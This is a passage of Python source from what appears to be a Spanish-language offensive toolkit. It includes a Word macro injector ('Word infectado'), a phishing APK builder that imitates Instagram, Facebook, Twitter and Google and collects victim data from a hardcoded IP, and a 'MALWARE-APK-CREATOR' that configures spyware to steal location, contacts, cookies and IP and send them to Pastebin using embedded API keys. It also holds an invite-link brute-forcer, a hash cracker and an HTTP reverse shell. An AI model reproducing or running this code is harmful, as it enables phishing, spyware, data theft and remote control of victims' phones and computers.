        print(tabulate(getted, headers=["DIRECTORIOS ENCONTRADOS", "CODIGO", "ESTADO"], tablefmt="simple"))
    except ValueError:
        crint("[ERROR] Caracter no valido ...")

def wordinfect(ruta, macro):

    if "termux" not in ROOT_MAX:
        def integracion():

            # Load Word document.
            doc = aw.Document(ruta)
            leer=open(macro)

            # Create VBA project
            project = aw.vba.VbaProject()
            project.name = "MacroProject"
            doc.vba_project = project

            # Create a new module and specify a macro source code.
            module = aw.vba.VbaModule()
            module.name = "MacroModule"
            module.type = aw.vba.VbaModuleType.PROCEDURAL_MODULE
            module.source_code = leer.read()

            # Add module to the VBA project.
            doc.vba_project.modules.add(module)

            # Save document.
            doc.save(ruta_save)

            try:
                ruta_save=ruta.replace(".docm","_2.docm")
                integracion()
            except:
                pass
            else:
                crint("[PASS] Word infectado guardado en =>> {}".format(ruta_save))
    
    else:
        crint(translate("[ERROR] Wordinfect aun no disponible en Termux ..."))

def sc4pk(idcap, selec):

    if selec != None:
        selec = selec.lower()

    ver_carpeta=os.listdir(".")

    base_apk={

        "ig":"instagram",
        "fb":"facebook",
        "tw":"twitter",
        "go":"google"

    }

    def crear(selec, idcap):

        REMP=base_apk.get(selec)

        try:
            
            asset_save=open(os.path.join("Scam_2", "assets", "selec.rdp"), "w")
            asset_save.write(REMP)
            asset_save.close()

            asset_save=open(os.path.join("Scam_2", "assets", "id.rdp"), "w")
            asset_save.write(idcap)
            asset_save.close()

            """
            xml_open=codecs.open(".xml", "r", encoding="utf-8")
            xml_read=xml_open.read()
            xml_read=xml_read.replace("ID_MG", idcap).replace("SELEC_MG", REMP)
            xml_open.close()

            xml_open=open("main.xml", "wb", encoding="utf-8")
            xml_open.write(xml_read)
            xml_open.close() # Solucionar error de encode
            """
            # Movimiento de archivos
            #shutil.rmtree("Scam_2/res/layout/main.xml")
            #shutil.rmtree("Scam_2/res/drawable-xhdpi-v4/app_icon.png")

            shutil.move(os.path.join("Scam_2", "res", "drawable-xhdpi-v4", f"{REMP}.png"), os.path.join("Scam_2", "res", "drawable-xhdpi-v4", "app_icon.png"))

            if "win" in SYS_GLOBAL:
                crint(f"[PASS] Comprime la APK que se encuentra en:\n[PATH] {ROOT_MAX}/ ->> Scam_2/")
            else:
                os.chdir("Scam_2/")
                os.system("zip -r Lite.apk *")
                crint(f"[PASS] APK Sin firma guardado en:\n[PATH] {ROOT_MAX}Scam_2/ ->> Lite.apk")

            #shutil.move("main.xml", "Scam_2/res/layout/main.xml") 

        except Exception as err:
            crint(f"[ERROR] {err}")
            pass
        
        else:
            #print()
            crint("[PASS] =>> Tarea terminada con exito ...")
            exit(0)

    def obtener(idcap):

        CONTADOR = 0

        try:
            obtiene=requests.get("http://192.71.249.244:60001/comments")
        except Exception as err:
            crint(f"[ERROR] {err}")
            pass
        else:

            sopa=BeautifulSoup(obtiene.text, "html.parser")

            obtener=str(sopa.find_all(id="comments"))
            obtener=obtener.replace("<br/>", "\n")

            temp=open(".temp", "w", encoding="utf-8")
            temp.write(obtener)
            temp.close()

            temp=open(".temp", encoding="utf-8")
            temp_read=temp.readlines()

            chek=False

            for word in temp_read:
                word=word.replace("\n","")

                if idcap in word:
                    CONTADOR=CONTADOR+1
                    #print(word) DEVOLPING COMMENTS
                    chek=True

                    #print("\n[TARGET]->> SCAM.APK\n")
                    word=word.replace(idcap,"").replace(" ","").replace("</div>]","")
                    #print(word)
                    try:
                        crint(f"[INFO] Tu ID Hex =>> [{CONTADOR}]")
                        word=str(codecs.decode(word,"hex"))
                        print(word.replace("\\n","\n").replace("b'","[TARGET]->> SCAM.APK ->> ").replace("#'","\n").replace("%40","@").replace("%C3%B1","ñ"))
                    
                    except Exception as err:
                        crint(f"[ERROR] {err}")
                        exit(0)

            if chek == False:
                crint("[ERROR] No se lograron encontrar victimas asociadas a tu ID ...")
                exit(0)

            temp.close()
            os.remove(".temp")

    if selec in base_apk and selec != None:

        try:
            if "Scam_2" in ver_carpeta:
                shutil.rmtree("Scam_2")
                shutil.copytree(os.path.join("assets", "Scam"),"Scam_2")
            else:
                shutil.copytree(os.path.join("assets", "Scam"),"Scam_2")    # Bloque encargado de verificar si hay el apk que se va a crear

        except Exception as err:
            print(err)

        crear(selec, idcap)
    
    if selec == None:
        
        obtener(idcap)

def urljump(select, cant):
    
    # Localizacion de header beta antes estaba en requests_multi_th
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (Linux; Android 10)"
        ])
    }

    saved_ = []

    def exit_emer_():

        if saved_ != []:
            print("\n",tabulate(saved_, headers=["ENLACES ENCONTRADOS"]))
        else:
            crint(f"---------------------\n[ERROR] No encontramos ningun enlace valido ...")
        return

    
    # funcion para testear codigo de error 429

    def not_429(url_chk):

        chk_label = []

        for i in range(5):
            try:
                ch_ = requests.get(url_chk, headers=headers)
                chk_label.append(ch_.status_code)
            except Exception as err:
                crint(f"[ERROR] {err}")

        if chk_label.count(429) == len(chk_label):
            crint("[ERROR] Conexion con el servidor perdida ->> [429]")
            exit_emer_()

    # 0 = wsp 1 = discord 2 = telegram

    chk_ = {

        "wa": 0,
        "dc": 1,
        "tg": 2,
        "bt": 3,
        "yt": 4,
        "ip": 5
        
    }

    select = select.lower(); cant = int(cant)

    if select in chk_ and cant > 0:

        crint(f"[INFO] Generando {select.upper()} links =>> [{cant}]\n---------------------")

        select = chk_[select]#; select = int(select)
        url = [

            # 0 = url                1 = str char                  2 = error str
            ["chat.whatsapp.com/", r'[\l\d]{22}', "https://static.whatsapp.net/rsrc.php/v4/yB/r/_0dVljceIA5.png"],
            ["discord.gg/", r'[\l\d]{8}', 'property="og:image"'], # Solucionar problema de baneo --> Ya esta listo xd
            ["t.me/+", r'[\l\d]{16}', "tgme_icon_group"],
            ["bit.ly/", r'[\l\d]{7}', "/static/graphics/meditation.png"],
            ["www.youtube.com/watch?v=", r'[\l\d-_]{11}', '"status":"ERROR"'],
            # Desarrollo no funcional aun #
            ["meet.google.com/", r"[\l]{3}-[\l]{4}-[\l]{3}", ""],
            ["iplogger.org/es/logger/", r'[\l\d]{2}105[\l\d]{7}', "error"] # Error aun no encontramos el scraping

        ]

        str_wb = StringGenerator(f"{url[select][1]}").render_list(cant, unique=True) # 200 = can make

        #str_wb[100] = "9geG9GgD"
        #str_wb.append("qNnja1EMaT5mMjE0")

        #for url_s in str_wb:

        # BETA
        def requests_mulith(url_s):

            try:
                soli = requests.get(f"https://{url[select][0]}{url_s}", headers=headers)
            except KeyboardInterrupt:
                exit_emer_()
            except Exception as err:
                crint(f"[ERROR] {err}")
                exit_emer_()

            """
            with open("a.txt", "w", encoding="utf-8") as a:
                a.write(soli.text)

            #print(soli.text)
            exit(0)
            """

            if soli.status_code == 429: # Cuando nos tiran del server
                not_429(f"https://{url[select][0]}{url_s}")

            if url[select][2] not in soli.text:
                crint(f"[PASS] https://{url[select][0]}{url_s} ->> [{soli.status_code}] ✓")
                saved_.append([f"https://{url[select][0]}{url_s}"])

            else:
                crint(f"[INFO] https://{url[select][0]}{url_s} ->> [{soli.status_code}]")
        
        # BETA
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as multi_soli:
            multi_soli.map(requests_mulith, str_wb)

        exit_emer_()
    
    else:
        crint("[ERROR] Opcion no encontrada ...")

def unlocker(type_, dictionary, hash_):
    type_ = type_.lower()
    try:
        with open(dictionary, "r", encoding="utf-8") as dictionary_:

            for match_ in dictionary_:

                match_ = match_.strip()
                if type_ == "md5":

                    unl_ = md5(match_.encode("utf-8")).hexdigest()
                    if unl_ == hash_:
                        crint(f"[PASS] {match_} <---✓---> {unl_}")
                        exit(0)
                
                if type_ == "sha1":
                    unl_ = sha1(match_.encode("utf-8")).hexdigest()
                    if unl_ == hash_:
                        crint(f"[PASS] {match_} <---✓---> {unl_}")
                        exit(0)
                
                crint(f"[INFO] {match_} <---x---> {unl_}")

    except Exception as err:
        crint(f"[ERROR] {err}")

def m4cware():

    try:
        with open(".id", "r", encoding="utf-8") as one_id_scan:
            one_id = json.load(one_id_scan)

    except:

        with open(".id", "w", encoding="utf-8") as one_id_scan:

            ####### APARTE DE VALIDAR SI YA SE ABRIO EL PROGRAMA, TAMBIEN GUARDA LAS CREDENCIALES PUBLICAS.

            one_id_app = f"m{random.randint(1, 9)}_{random.randint(1, 10)}_node_{random.randint(1, 10)}_web.json"
            one_id = {

                "one_id": one_id_app,
                "api_dev_key": "uiqdqjM5LG8gdaKaUo05nzSZGIFO2msx", # cuenta nueva
                "api_user_key": "26e531de791eb3a446ed18788e9dfb94" # cuenta nueva

            }

            one_id_scan.write(str(one_id).replace("'", '"'))

    AC_options = [
        # Los Booleanos son para saber si estan disponibles o no.
        # Los numeros 0 son aquellos que no ocupan recursos de envio a Pastebin.
        # Los ["null"] son aquellos que no tienen permisos necesarios.
        ["01) Borrar Directorio", False, 0, ["READ_EXTERNAL_STORAGE", "WRITE_EXTERNAL_STORAGE"] ],
        ["02) Informacion del Telefono", False, 1, ["null"] ],
        ["03) Abrir Enlace", False, 0, ["null"] ],
        ["04) Llamada o Comando telefonico", False, 0, ["CALL_PHONE"] ],
        ["05) Obtener Localizacion", False, 16, ["ACCESS_FINE_LOCATION"] ],
        ["06) Obtener IP", False, 4, ["null"] ],
        ["07) Obtener Cookies de Sesion [BETA]", False, 32, ["null"]],
        ["08) Obtener Contactos [BETA]", False, 8, ["READ_CONTACTS"]],
        ["09) Obtener Historial De Ubicaciones [BETA]", False, 2, ["READ_EXTERNAL_STORAGE"]] # Los numeros son para identificar que zona debe de enviar en base a las sumas de estos mismos.

        ]

    LY_options = [

        ["01) Modificar Package Name [NOT FOUND]", "com.lite.lt"],
        ["02) Modificar Name", "Lite"],
        ["03) Modificar Color de Barra Superior", "#ff000000"],
        ["04) Modificar Icono de Aplicacion", "Default"],
        ["05) Modificar Contenido de Aplicacion", "https://www.google.com"],
        ["06) Modificar el Peso de Aplicacion", "0"],
        ["07) Activar Envio Multiple", "False"]

    ]

    # LY_tmp = ["com.lite.lt", "Lite", "#ff000000", "Default", "https://www.google.com"]

    AC_map = {
        "one_id": one_id["one_id"], "api_dev_key": one_id["api_dev_key"],
        "api_user_key": one_id["api_user_key"],"load": "https://www.google.com"
        }

    def victims_apk():

        while True:

            check = False; get_url = []; file_sv = "" # Variables del bloque de deteccion y almacenamiento de URLS asociadas
            #-------------- Identificador unico

            params = {

                "api_dev_key": one_id["api_dev_key"], # cuenta nueva
                "api_user_key": one_id["api_user_key"], # cuenta nueva
                "api_option": "list",
                "api_results_limit": "1000"

            }

            try:
                paste = requests.post("https://pastebin.com/api/api_post.php", data=params); paste_ = str(paste.text).splitlines()  # Se obtiene y se guarda en una variable los resultados
            except Exception as err:
                crint(f"[ERROR] {err}")

            if len(paste_) > 5:

                for linea in paste_:
                    
                    if one_id["one_id"] in linea: # Se verifica y confirma la existencia del nombre en el historial
                        check = True

                    if check == True:
                        if "https://" in linea: # Se obtiene el enlace mas proximo del identificador
                            get_url.append(linea.strip().replace("<paste_url>", "").replace("</paste_url>", ""))
                            check = False # Se vuelve a desactivar para seguir en busqueda iterativa

                if get_url != []:

                    try:
                        select = int(input(f"""
VICTIMS ->> [{len(get_url)}]
---------------------------
01) Descargar Resultados
02) Verificar Resultados
---------------------------
99) Salir

m4cware->> """))
                        
                        if select == 1:
                            try:
                                for url_ in get_url:
                                    file_dw = requests.get(url_.replace("pastebin.com/", "pastebin.com/raw/"))
                                    file_sv = file_sv + str(file_dw.text) + "\n"
                                with open("targets.txt", "w", encoding="utf-8") as file_fl:
                                    file_fl.write(file_sv)
                                crint("[PASS] Archivo targets.txt descargado correctamente ...")
                            except Exception as err:
                                crint(f"[ERROR] {err}")

                        if select == 2:
                            select = int(input(f"VICTIMS SELECT // [{len(get_url)}/{len(get_url)}] ->> "))
                            try:
                                file_dw = requests.get(get_url[select-1].replace("pastebin.com/", "pastebin.com/raw/"))
                                print("---------------------------")
                                print(file_dw.text.replace("{", "{\n").replace(",",",\n").replace('"};', '"\n};'))
                            except Exception as err:
                                crint(f"[ERROR] {err}")
                        
                        if select == 99:
                            break

                    except Exception as err:
                        crint(f"[ERROR] {err}")
            else:
                crint("[ERROR] Aun no se han encontrado victimas ...")
                break

    def style_apk():
        
        while True:

            print("IMPLEMENTATION ACTIVITIES =>> [APK]\n-----------------------------------")

            for item in LY_options:
                print(item[0], "["+item[1]+"]")

            try:
                select = int(input("-----------------------------------\n99) Guardar & Salir\n\nm4cware->> "))

                if select == 1:
                    #ly_select = input("Nuevo Package Name: ")
                    pass
                elif select == 2:
                    ly_select = input("Nuevo Name: ")
                elif select == 3:
                    ly_select = input("Nuevo Color de Barra Superior [HEX]: ")
                elif select == 4:
                    ly_select = input("Ruta del nuevo icono de la APK: ")
                elif select == 5:
                    ly_select = input("URL de la pagina web que se mostrara como contenido: ")
                    AC_map["load"] = ly_select
                elif select == 6:
                    ly_select = input("Ingresa el peso en MB a aumentar: ")
                elif select == 7:
                    ly_select = "True"
                    AC_map.setdefault("reload", "True")
                elif select == 99:
                    break
                
                if select != 1: # Este condicional es para evitar que usen el numero 1
                    LY_options[select-1][1] = ly_select

            except Exception as err:
                crint(f"[ERROR] {err}")

    def actions_apk():

        while True:

            print("IMPLEMENTATION ACTIVITIES =>> [APK]\n-----------------------------------")

            for item in AC_options:
                if item[1] == True:
                    print(item[0], "✓")
                else:
                    print(item[0])
            try:
                select = int(input("-----------------------------------\n99) Guardar & Salir\n\nm4cware->> "))

                if select == 99:
                    break

                if AC_options[select-1][1] == True:
                    crint("[BUSY] Opcion ya implementada ...")

                if select == 1 and AC_options[0][1] == False: # Del file or Dir
                    ac_inp = input("Ingresa la ruta a eliminar: ")
                    AC_map.setdefault("del", ac_inp)
                elif select == 2 and AC_options[1][1] == False: # Info phone
                    AC_map.setdefault("info", "on") 
                elif select == 3 and AC_options[2][1] == False: # Open naveg
                    ac_inp = input("Ingresa el enlace a abrir en el navegador: ")
                    AC_map.setdefault("open", ac_inp)
                elif select == 4 and AC_options[3][1] == False: # Call numbre or USSD 
                    ac_inp = input("Ingresa el numero telefonico o codigo a ejecutar: ")
                    AC_map.setdefault("call", ac_inp)
                elif select == 5 and AC_options[4][1] == False: # Locate
                    AC_map.setdefault("locate", "on")
                elif select == 6 and AC_options[5][1] == False: 
                    AC_map.setdefault("ip", "on")
                elif select == 7 and AC_options[6][1] == False: 
                    AC_map.setdefault("cookies", "on")
                elif select == 8 and AC_options[7][1] == False: 
                    AC_map.setdefault("contacts", "on")
                elif select == 9 and AC_options[8][1] == False:
                    AC_map.setdefault("history_gps", "on")

                AC_options[select-1][1] = True # Se cambia el valor de la opcion a True indicando que ya se a realizado una opcion
                # indicando asi que no se puede utilizar
            except Exception as err:
                crint(f"[ERROR] {err}")

    def compilar():

        try:
            if len(AC_map) == 4:
                crint("[ERROR] Aun no modificas el APK ...")

            else:
                dirs_ = os.listdir(".")

                # Linux y windows

                try:
                    if "apktool.jar" not in dirs_ and "win" in SYS_GLOBAL:

                        down_bat = requests.get("https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat")
                        downl_apk = requests.get("https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.10.0.jar")
                    
                        with open("apktool.jar", "wb") as apk_tool, open("apktool.bat", "wb") as apk_tool_bat:
                            apk_tool.write(downl_apk.content)
                            apk_tool_bat.write(down_bat.content)
                
                except Exception as err:
                    crint(f"[ERROR] {err}")
                
                if "m4.apk" not in dirs_:             # Importa el apk para trabajar mejor con ella
                    shutil.copy(os.path.join("assets", "m4.apk"), ".")

                ## Linux y Windows
                if "win" in SYS_GLOBAL:
                    os.system(".\\apktool.bat m4.apk")
                else:
                    os.system("apktool d m4.apk")

                #############################################################
                #                       Layaut VARS                         #
                #############################################################
                strings_ = os.path.join("m4", "res", "values", "strings.xml")
                colors_ = os.path.join("m4", "res", "values", "colors.xml")
                pack_age_name_dir = os.path.join("m4", "AndroidManifest.xml")
                app_icon_ = os.path.join("m4", "res", "drawable-xhdpi", "app_icon.png")
                size_bin = os.path.join("m4", "assets", "resources.conf")
                #############################################################
                #                       Actions VARS                        #
                #############################################################
                assets_json = os.path.join("m4", "assets", "info.json")
                #############################################################
                #                   Modification of Files                   #
                #############################################################
                if LY_options[0][1] != "com.lite.lt":

                    temp_package = LY_options[0][1].replace(".", " ").split()
                    vars_lte = ["com", "lite", "lt"]
                    
                    pack_age_dirs_rename = os.path.join("m4", "smali_classes5", "")
                    vars_rename_lte = os.path.join("m4", "smali_classes5", "")
                    
                    for i in range(3):

                        os.rename(vars_rename_lte+vars_lte[i], pack_age_dirs_rename+temp_package[i])

                        pack_age_dirs_rename = os.path.join(pack_age_dirs_rename, temp_package[i], "")
                        vars_rename_lte = os.path.join(vars_rename_lte, temp_package[i], "")
                    
                    with open(pack_age_name_dir, "r") as pack_age_name:
                        read_package = pack_age_name.read(); read_package = read_package.replace("com.lite.lt", LY_options[0][1])
                    
                    with open(pack_age_name_dir, "w", encoding="utf-8") as pack_age_name:
                        pack_age_name.write(read_package)

                if LY_options[1][1] != "Lite":

                    with open(strings_, "r") as name:
                        # LECTURA DE CONTENDIO                ### MODIFICACION DEL CONTENIDO
                        read_name = name.read(); read_name = read_name.replace("Lite", LY_options[1][1])
                    with open(strings_, "w", encoding="utf-8") as name:
                        name.write(read_name)

                if LY_options[2][1] != "#ff000000":

                    with open(colors_, "r") as color:
                        read_color = color.read(); read_color = read_color.replace("#ff000000", LY_options[2][1])
                    with open(colors_, "w", encoding="utf-8") as color:
                        color.write(read_color)

                if LY_options[3][1] != "Default":      # Modifica el icon del apk
                    os.replace(LY_options[3][1], app_icon_)
                
                if LY_options[5][1] != "0":
                    #os.mkdir(size_bin.replace("resources.conf", ""))

                    size_ = int(LY_options[5][1]) * 1024 * 1024

                    with open(size_bin, "wb") as binario:
                        binario.write(os.urandom(size_))

                #############################################################
                #                       Making JSON                         #
                #############################################################

                sum_ = 0
                for numero in AC_options:

                    if numero[1] == True: # Se encarga de solamente sumar las acciones agregadas
                        sum_ = numero[2] + sum_
                
                if sum_ >= 32:                      # Problema matematico: Cada vez es el doble de lo anterior, probocado por la suma de estos mismos.
                    sender_ = "cookies"             # Es decir: La suma de las opciones anteriores + 1 es el siguiente orden de prioridad.
                if sum_ >= 16 and sum_ < 32:
                    sender_ = "locate"
                if sum_ >= 8 and sum_ < 16: 
                    sender_ = "contacts"
                if sum_ >= 4 and sum_ < 8:   
                    sender_ = "ip"
                if sum_ >= 2 and sum_ < 4:
                    sender_ = "history_gps"
                if sum_ == 1:
                    sender_ = "info"
                
                if sum_ > 0:
                    AC_map.setdefault("sender", sender_) # Configura que parte del codigo en la app envia la informacion 

                with open(assets_json, "w", encoding="utf-8") as save_json: # Guarda el json encargado del comportamiento del apk
                    save_json.write(str(AC_map).replace("'", '"'))
                
                #############################################################
                #                Delete Unnecessary Permissions             #
                #############################################################

                emergency_ = '    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n' # Acces_Network nunca se borra, por ende se toma como referencia

                with open(pack_age_name_dir, "r") as android: # Bloque encargado de quitar o dejar permisos dependiendo de la seleccion
                    lectura = android.read()

                    for opciones in AC_options: # Por cada opcion en AC_Options

                        if opciones[1] == False and len(opciones[3]) > 1: # Si la opcion con permisos no se esta ocupando Y la opcion tiene mas de 1 permiso

                            for permiso in opciones[3]: # Por cada permiso se borra de Android Manifest
                                permiss =  f'    <uses-permission android:name="android.permission.{permiso}"/>\n'
                                lectura = lectura.replace(permiss, "")

                        elif opciones[1] == False and opciones[3][0] != "null": # Mientras el permiso no sea null y el permiso no esa ocupandose

                            permiss = f'    <uses-permission android:name="android.permission.{opciones[3][0]}"/>\n'
                            lectura = lectura.replace(permiss, "")

                        elif opciones[1] == True and opciones[3][0] not in lectura: # Si es que el permiso que se va a ocupar ya se elimino

                            permiss = f'    <uses-permission android:name="android.permission.{opciones[3][0]}"/>\n'
                            lectura = lectura.replace(emergency_, emergency_+permiss) # Agrega el permiso que se necesita
                
                with open(pack_age_name_dir, "w", encoding="utf-8") as save_android:
                    save_android.write(lectura)
                
                ## Linux y windows

                if "win" in SYS_GLOBAL:
                    os.system(".\\apktool.bat b m4 -o m4_moded.apk")
                else:
                    os.system("apktool b m4 -o m4_moded.apk")
                
                try:
                    shutil.rmtree("m4"); os.remove("m4.apk")  # Elimina los archivos ya ocupados
                    
                except Exception as err:
                    crint(f"[ERROR] {err}")
        
        except Exception as err:
            os.remove("m4.apk")
            crint(f"[ERROR] {err}")

    def api_settings():
        while True:
            try:
                new_dev = input("""
API SETTINGS <> [M4CWARE]
-------------------------
PASTEBIN [https://pastebin.com/doc_api]

Introduce tu 'api_dev_key' de Pastebin: """)
                
                new_user = input("Introduce tu 'api_user_key' de Pastebin: ")

                with open(".id", "w", encoding="utf-8") as new_paste:

                    one_id["api_dev_key"] = new_dev; one_id["api_user_key"] = new_user
                    new_paste.write(str(one_id).replace("'", '"'))

                crint("[PASS] Claves ingresadas con exito ...")
                exit(0)

            except Exception as err:
                crint(f"[ERROR] {err}")

    while True:
        try:
            select = int(input("""
OPTIONS ->> [MALWARE-APK-CREATOR]
---------------------------------
01) APK Style   03) APK Victims
02) APK Actions 04) API Settings
---------------------------------
99) Salir       00) Compilar

m4cware->> """))
        except Exception as err:
            crint(f"[ERROR] {err}")
        else:
            if select == 1:
                style_apk()
            elif select == 2:
                actions_apk()
            elif select == 3:
                victims_apk()
            elif select == 4:
                api_settings()
            elif select == 00:
                compilar()
            else:
                exit(0)

def reverhttp(url_port):

    headers = {"Cache-Control":"no-cache"}

    cmd_help="""
[HTTPREVERSE]->>[V.1.0]

ASSOC          Muestra o modifica las asociaciones de las extensiones
               de archivos.
ATTRIB         Muestra o cambia los atributos del archivo.
BREAK          Establece o elimina la comprobación extendida de Ctrl+C.
BCDEDIT        Establece propiedades en la base de datos de arranque para
               controlar la carga del arranque.
CACLS          Muestra o modifica las listas de control de acceso (ACLs)
               de archivos.
CALL           Llama a un programa por lotes desde otro.
CD             Muestra el nombre del directorio actual o cambia a otro
               directorio.
CHCP           Muestra o establece el número de página de códigos activa.
CHDIR          Muestra el nombre del directorio actual o cambia a otro
               directorio.
CHKDSK         Comprueba un disco y muestra un informe de su estado.
CHKNTFS        Muestra o modifica la comprobación de disco al arrancar.
CLS            Borra la pantalla.
CMD            Inicia una nueva instancia del intérprete de comandos
               de Windows
COLOR          Establece los colores de primer plano y fondo predeterminados
               de la consola.
COMP           Compara el contenido de dos archivos o un conjunto de archivos.
COMPACT        Muestra o cambia el estado de compresión de archivos
               en particiones NTFS.
CONVERT        Convierte volúmenes FAT a volúmenes NTFS. No puede convertir
               la unidad actual.
COPY           Copia uno o más archivos en otra ubicación.
DATE           Muestra o establece la fecha.
DEL            Elimina uno o más archivos.
DIR            Muestra una lista de archivos y subdirectorios en un
               directorio.
DISKPART       Muestra o configura las propiedades de partición de disco.
DOSKEY         Edita líneas de comando, recupera comandos de Windows y
               crea macros.
DRIVERQUERY    Muestra el estado y las propiedades actuales del controlador de dispositivo.
ECHO           Muestra mensajes, o activa y desactiva el eco.
ENDLOCAL       Termina la búsqueda de cambios de entorno en un archivo por lotes.
ERASE          Elimina uno o más archivos.
EXIT           Sale del programa CMD.EXE (intérprete de comandos).
FC             Compara dos archivos o conjunto de archivos y muestra las
               diferencias entre ellos.
FIND           Busca una cadena de texto en uno o más archivos.
FINDSTR        Busca cadenas en archivos.
FOR            Ejecuta el comando especificado para cada archivo en un conjunto de archivos.
FORMAT         Formatea un disco para usarse con Windows.
FSUTIL         Muestra o configura las propiedades del sistema de archivos.
FTYPE          Muestra o modifica los tipos de archivo usados en
               asociaciones de extensión de archivo.
GOTO           Direcciona el intérprete de comandos de Windows a una línea con etiqueta
               en un programa por lotes.
GPRESULT       Muestra información de directiva de grupo por equipo o usuario.
GRAFTABL       Permite a Windows mostrar un juego de caracteres extendidos
               en modo gráfico.
HELP           Proporciona información de Ayuda para los comandos de Windows.
ICACLS         Muestra, modifica, hace copias de seguridad o restaura listas de control de acceso (ACL) para archivos y
               directorios.
IF             Ejecuta procesos condicionales en programas por lotes.
LABEL          Crea, cambia o elimina la etiqueta del volumen de un disco.
MD             Crea un directorio.
MKDIR          Crea un directorio.
MKLINK         Crea vínculos simbólicos y vínculos físicos
MODE           Configura un dispositivo de sistema.
MORE           Muestra la información pantalla por pantalla.
MOVE           Mueve uno o más archivos de un directorio a otro en la
               misma unidad.
OPENFILES      Muestra archivos compartidos abiertos por usuarios remotos como recurso compartido de archivos.
PATH           Muestra o establece una ruta de búsqueda para archivos ejecutables.
PAUSE          Suspende el proceso de un archivo por lotes y muestra un mensaje.
POPD           Restaura el valor anterior del directorio actual guardado
               por PUSHD.
PRINT          Imprime un archivo de texto.
PROMPT         Cambia el símbolo de comandos de Windows.
PUSHD          Guarda el directorio actual y después lo cambia.
RD             Quita un directorio.
RECOVER        Recupera la información legible de un disco dañado o defectuoso.
REM            Registra comentarios (notas) en archivos por lotes o CONFIG.SYS.
REN            Cambia el nombre de uno o más archivos.
RENAME         Cambia el nombre de uno o más archivos.
REPLACE        Reemplaza archivos.
RMDIR          Quita un directorio.
ROBOCOPY       Utilidad avanzada para copiar archivos y árboles de directorios
SET            Muestra, establece o quita variables de entorno de Windows.
SETLOCAL       Inicia la localización de los cambios de entorno en un archivo por lotes.
SC             Muestra o configura servicios (procesos en segundo plano).
SCHTASKS       Programa comandos y programas para ejecutarse en un equipo.
SHIFT          Cambia la posición de parámetros reemplazables en archivos por lotes.
SHUTDOWN       Permite el apagado local o remoto de un equipo.
SORT           Ordena la salida.
START          Inicia otra ventana para ejecutar un programa o comando especificado.
SUBST          Asocia una ruta de acceso con una letra de unidad.
SYSTEMINFO     Muestra las propiedades y la configuración específicas del equipo.
TASKLIST       Muestra todas las tareas en ejecución, incluidos los servicios.
TASKKILL       Termina o interrumpe un proceso o aplicación que se está ejecutando.
TIME           Muestra o establece la hora del sistema.
TITLE          Establece el título de la ventana de una sesión de CMD.EXE.
TREE           Muestra gráficamente la estructura de directorios de una unidad o
               ruta de acceso.
TYPE           Muestra el contenido de un archivo de texto.
VER            Muestra la versión de Windows.
VERIFY         Comunica a Windows si debe comprobar que los archivos se escriben
               de forma correcta en un disco.
VOL            Muestra la etiqueta del volumen y el número de serie del disco.
XCOPY          Copia archivos y árboles de directorios.
WMIC           Muestra información de WMI en el shell de comandos interactivo.

[ESTA VISION ES DESDE TU MAQUINA]
"""

    path_dir = os.listdir(".")

    if "server" not in path_dir:

        os.mkdir("server")
        inicio=open(os.path.join("server", "cmd.txt"), "w")
        inicio.write("systeminfo")
        inicio.close()
        
        lst = ["cmd_reverse.php", "cmd.php"]
        
        for move_ in lst:
            shutil.copy(os.path.join("assets", move_), "server/")

    def server(port):

        try:
            if ":" in port: 
                creacion(port)
            else:
                port = int(port)

                if "win" not in SYS_GLOBAL:

                    try:
                        crint('[INFO] Servidor corriendo en =>> http://localhost:{}'.format(port))
                        os.system("php -S localhost:{} -t server".format(port))

                    except Exception as err:
                        crint(f"[ERROR] {err}")
                        pass
                else:
                    crint("[INFO] Abrir servidor con PHP aun esta en desarrollo ...")

        except Exception as err:
            crint(f"[ERROR] {err}")

    def maquina(server_str):
        pasado=""

        crint("[INFO] Esperando conexion ...")
        while True:
            time.sleep(1)

            try:
                
                if ":" not in server_str.replace("://", ""): # Si la url no es localhost
                    obtener_resultado = requests.get(f"{server_str}capture.txt", headers=headers)
                    leer = obtener_resultado.text
                
                else:
                    lectura=open(os.path.join("server", "capture.txt"))
                    leer=lectura.read()
                    lectura.close()
                
            except:
                leer=""
                pass

            else:

                nuevo = str(leer)

                if nuevo != "" and nuevo != pasado:

                    pasado=nuevo
                    print(nuevo.replace("[ESP]", " ").replace("\\r\\n","\n"))

                    comando=input("reverchttp =>>")

                    if comando == "exit":
                        break
                    if comando == "help":
                        print(cmd_help)  # NUEVA LINEA... PROBAR MAÑANA
                        pass

                    if ":" not in server_str.replace("://", ""): # Si la url no es localhost

                        data={"cmd":"{}".format(comando)}
                        
                        try:
                            obtener_resultado = requests.post(f"{server_str}cmd_reverse.php", data=data)
                        except:
                            pass
                    
                    else:

                        data=open(os.path.join("server", "cmd.txt"), "w")
                        data.write(comando)
                        data.close()
                else:
                    pass

    def creacion(server_str):

        try:
            if server_str + "/" not in server_str:
                server_str = server_str + "/"

            with open(os.path.join("assets", "reversehttp.py"), "r") as leer, open(os.path.join("server", "reversehttp_clone.py"), "w") as escribir:
                leer_str = leer.read()
                escribir.write(leer_str.replace("URL_FUN",server_str))
            
            crint("[PASS] Archivo guardado en ./server/reversehttp_clone.py")
            crint("-------------------------------------------------\n[INFO] Entrando en modo escucha [20sec] ...")
            time.sleep(20)
            maquina(server_str)

        except Exception as err:
            crint(f"[ERROR] {err}")
    
    server(url_port)

def shorty(rrss, url, sub):

    if sub == None:
        sub = ""
    
    if url == None:
        url = ""
    
    rrss = rrss.lower()

    domains_ = {

        "tin": 0,
        "rid": 1,
        "you": 2,
        "wha": 3,
        "lin": 4,
        "goo": 5
        
    }
    
    data = {

        "url": url,
        "domain": domains_[rrss],
        "alias": sub,
        "expiration_date": "",
        "expiration_hits": "",
        "cloak": 0,
        "password": ""

    }

    if "://" not in url or url == None or rrss == None or rrss.lower() not in domains_:
        crint("[ERROR] Introduce una URL valida ...")
    
    else:

        try:
            shorty_ = requests.post("https://shorten.ly/g.php", data=data)

            dict_j = json.loads(shorty_.content)
            #dict_j_key = dict_j.keys()
            #for key in dict_j_key:     SE MUESTRA CADA RESULTADO
                #print(f"{key} => {dict_j[key]}".upper()) 

